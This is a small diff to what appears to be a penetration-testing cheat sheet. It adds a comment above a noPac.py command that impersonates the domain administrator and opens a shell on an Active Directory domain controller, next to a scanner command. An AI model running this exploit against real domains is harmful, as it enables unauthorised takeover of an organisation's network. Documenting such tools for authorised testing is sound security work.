@@ -477,6 +477,7 @@ sudo python3 scanner.py <domain>/<username>:<password> -dc-ip <domain controller
 ```
 
 ```shell
+# Use the full path to get files
 sudo python3 noPac.py <domain>/<username>:<password> -dc-ip <domain controller> -dc-host <hostname> -shell --impersonate administrator -use-ldap
 ```
 
